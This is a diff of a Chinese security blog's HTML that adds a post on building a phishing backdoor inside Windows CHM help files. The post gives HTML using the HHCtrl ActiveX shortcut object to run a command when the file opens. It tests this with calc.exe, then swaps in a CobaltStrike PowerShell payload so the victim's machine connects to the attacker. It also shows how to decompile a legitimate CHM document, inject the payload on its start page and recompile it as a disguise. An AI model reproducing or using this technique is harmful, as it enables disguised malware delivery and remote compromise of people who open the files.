@@ -199,7 +199,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Frp%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">Frp内网转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ueditor%E6%BC%8F%E6%B4%9E/" rel="tag">Ueditor漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kerberos/" rel="tag">kerberos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/" rel="tag">内网漫游</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">教育系统 漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%98%9F%E5%A4%967i24%E6%8F%90%E6%9D%83/" rel="tag">星外7i24提权</a></li></ul>
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Frp%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">Frp内网转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ueditor%E6%BC%8F%E6%B4%9E/" rel="tag">Ueditor漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kerberos/" rel="tag">kerberos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/" rel="tag">内网漫游</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">教育系统 漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%98%9F%E5%A4%967i24%E6%8F%90%E6%9D%83/" rel="tag">星外7i24提权</a></li></ul>
                     </div>
                 </section>
                 
@@ -269,6 +269,74 @@
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-cs-chm-online" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/08/cs-chm-online/" class="article-date">
+      <time datetime="2021-01-07T18:28:43.000Z" itemprop="datePublished">2021-01-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/08/cs-chm-online/">CobaltStrike实现Chm后门</a>
+    </h1>
+  
+
+      </header>
+      
+    
+<div class="article-entry" itemprop="articleBody">
+    
+        
+        <h2 id="Chm简介"><a href="#Chm简介" class="headerlink" title="Chm简介"></a>Chm简介</h2><p>类似于一款用于存储信息和图文的帮助文档，里面可以集成很多页面，由html渲染而成，通过调用Windows中的hh.exe来执行。</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="Chm钓鱼后门文件制作——打开Chm就弹计算器"><a href="#Chm钓鱼后门文件制作——打开Chm就弹计算器" class="headerlink" title="Chm钓鱼后门文件制作——打开Chm就弹计算器"></a>Chm钓鱼后门文件制作——打开Chm就弹计算器</h3><p>需要用到的工具：<br>① EasyCHM<br>② CobaltStrike</p>
+<p>先安装好EasyChm，在桌面建立一个新文件夹名为testchm用来存放木马payload，单独一个文件夹为了方便后面在EasyChm中去打开这个项目，payload框架为html</p>
+<p>html源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Chm Calc Test&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;command exec &lt;OBJECT id&#x3D;x classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,payload&#39;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;x.Click();&lt;&#x2F;SCRIPT&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里的payload即为我们cs或msf生成的payload，这里以calc.exe来测试<br><img src="http://www.tu3k.cn/images/Chm/1.png" alt="calc" title="calc"><br>此时经过编译后，打开文档会弹出计算器</p>
+<p>编译：<br>打开EasyChm，新建项目，文件夹为刚才创建的testchm文件夹<br><img src="http://www.tu3k.cn/images/Chm/2.png" alt="testchm" title="testchm"><br>背景是打开后的页面，确认无误后点击编译，(和C语言差不多，编译——&gt;生成可执行文件),就会在上级目录生成一个testchm.chm<br><img src="http://www.tu3k.cn/images/Chm/3.png" alt="testchm" title="testchm"><br>双击运行 成功弹计算器<br><img src="http://www.tu3k.cn/images/Chm/4.png" alt="testchm" title="testchm"></p>
+<h3 id="CobaltStrike配合上线Chm"><a href="#CobaltStrike配合上线Chm" class="headerlink" title="CobaltStrike配合上线Chm"></a>CobaltStrike配合上线Chm</h3><p>CS生成ps payload<br><img src="http://www.tu3k.cn/images/Chm/5.png" alt="cs_chm" title="cs_chm"><br><img src="http://www.tu3k.cn/images/Chm/6.png" alt="ps_cs_chm" title="ps_cs_chm"><br>将payload把calc.exe替换即可，这里要注意，exe后要加个逗号<code>&#39;,&#39;</code>，而且ps代码里的双引号和html里的单引号会起冲突，将ps双引号删掉，html单换双即可<br><img src="http://www.tu3k.cn/images/Chm/7.png" alt="ps_cs_chm" title="ps_cs_chm"><br>没啥问题，编译，运行<br><img src="http://www.tu3k.cn/images/Chm/8.png" alt="ps_cs_chm" title="ps_cs_chm"><br>上线即可</p>
+<h3 id="正常Chm文档伪装上线"><a href="#正常Chm文档伪装上线" class="headerlink" title="正常Chm文档伪装上线"></a>正常Chm文档伪装上线</h3><p>流程：将一个正常的Chm帮助文档反编译成html源码，然后在html源码中插入我们的payload，重新编译，运行.<br>测试文档：之前看的一个关于星外提权的文档（星外提权.chm）<br>先使用 <code>hh.exe -decompile .\\html 星外提权.chm</code><br>将chm反编译，源码在同目录的html文件夹下，然后选择一个html文件编译 插入我们的HTML payload框架，注意要记住这个插入的html的文件名<br><img src="http://www.tu3k.cn/images/Chm/9.png" alt="ps_cs_chm" title="ps_cs_chm"><br>首页和显示页要设置存在payload的文件名，这样一打开就能运行我们的payload上线<br>编译<br><img src="http://www.tu3k.cn/images/Chm/10.png" alt="ps_cs_chm" title="ps_cs_chm"><br>运行成功上线<br><img src="http://www.tu3k.cn/images/Chm/11.png" alt="ps_cs_chm" title="ps_cs_chm"></p>
+
+    
+</div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-redis" class="article article-type-post" itemscope itemprop="blogPost">
   
